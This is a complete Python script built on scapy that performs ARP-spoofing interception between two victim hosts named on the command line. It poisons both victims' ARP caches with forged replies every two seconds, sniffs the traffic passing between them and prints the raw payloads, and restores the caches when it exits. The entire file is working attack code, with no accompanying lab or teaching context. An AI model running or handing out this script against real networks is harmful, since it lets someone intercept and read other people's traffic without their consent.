import sys
import time
import signal
from threading import Thread
from scapy.all import ARP, Ether, srp, sendp, sniff, conf, get_if_hwaddr, IP, Raw

# Interface used by the attacker
ATTACKER_INTERFACE = "eth0"
conf.verb = 0

# Global variables to store IP and MAC addresses
victim1_ip = ""
victim2_ip = ""
victim1_mac = ""
victim2_mac = ""
attacker_mac = ""

# Terminal color codes
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RESET = "\033[0m"


def get_mac(ip_address):
    """Send an ARP request to find the MAC address for a given IP"""
    print(f"Resolving MAC for {ip_address}...")
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
    answered, _ = srp(packet, timeout=2,
                      iface=ATTACKER_INTERFACE, verbose=False)
    if answered:
        return answered[0][1].hwsrc  # Return MAC from the reply
    print(f"{YELLOW}Warning: Failed to resolve MAC for {ip_address}{RESET}")
    return None


def spoof_arp(target_ip, target_mac, spoof_ip):
    """Send spoofed ARP reply to target, pretending to be spoof_ip"""
    packet = Ether(dst=target_mac, src=attacker_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip, hwsrc=attacker_mac
    )
    sendp(packet, iface=ATTACKER_INTERFACE, verbose=False)


def restore_arp():
    """Restore the original ARP table entries of both victims"""
    print(f"{BLUE}Restoring ARP tables...{RESET}")
    pkt1 = Ether(dst=victim1_mac, src=victim2_mac) / ARP(
        op=2, pdst=victim1_ip, hwdst=victim1_mac,
        psrc=victim2_ip, hwsrc=victim2_mac
    )
    pkt2 = Ether(dst=victim2_mac, src=victim1_mac) / ARP(
        op=2, pdst=victim2_ip, hwdst=victim2_mac,
        psrc=victim1_ip, hwsrc=victim1_mac
    )
    # Send each packet multiple times to ensure delivery
    sendp(pkt1, iface=ATTACKER_INTERFACE, count=3, verbose=False)
    sendp(pkt2, iface=ATTACKER_INTERFACE, count=3, verbose=False)
    print(f"{GREEN}ARP tables restored.{RESET}")


def sniff_packets():
    """Monitor and print IP traffic between the two victims"""
    def callback(pkt):
        if pkt.haslayer(IP):
            src = pkt[IP].src
            dst = pkt[IP].dst
            if (src == victim1_ip and dst == victim2_ip) or (src == victim2_ip and dst == victim1_ip):
                payload = pkt[Raw].load if pkt.haslayer(Raw) else b''
                print(f"Received traffic from {src} to {dst}: {payload!r}")
    print("Starting packet sniffing...")
    sniff(iface=ATTACKER_INTERFACE, prn=callback, store=0)


def main():
    global victim1_ip, victim2_ip, victim1_mac, victim2_mac, attacker_mac

    if len(sys.argv) != 3:
        print(f"{RED}Error: Incorrect Usage!{RESET}")
        print(
            f"{RED}Usage: python3 spoof_arp.py <victim1_ip> <victim2_ip>{RESET}")
        sys.exit(1)

    victim1_ip = sys.argv[1]
    victim2_ip = sys.argv[2]

    attacker_mac = get_if_hwaddr(ATTACKER_INTERFACE)
    victim1_mac = get_mac(victim1_ip)
    victim2_mac = get_mac(victim2_ip)

    if not victim1_mac or not victim2_mac:
        print(f"{RED}Error: Failed to obtain victim MAC addresses. Exiting.{RESET}")
        sys.exit(1)

    print(f"{BLUE}Attacker MAC: {attacker_mac}{RESET}")
    print(f"{BLUE}Victim 1: {victim1_ip} (IP), {victim1_mac} (MAC){RESET}")
    print(f"{BLUE}Victim 2: {victim2_ip} (IP), {victim2_mac} (MAC){RESET}")

    def handle_exit(sig, frame):
        print(f"\n{YELLOW}Ctrl+C received. Stopping ARP spoofing...{RESET}")
        restore_arp()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_exit)

    sniff_thread = Thread(target=sniff_packets, daemon=True)
    sniff_thread.start()

    print("Starting ARP spoofing... Press Ctrl+C to stop.")
    try:
        while True:
            spoof_arp(victim1_ip, victim1_mac, victim2_ip)
            spoof_arp(victim2_ip, victim2_mac, victim1_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        handle_exit(None, None)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
        restore_arp()
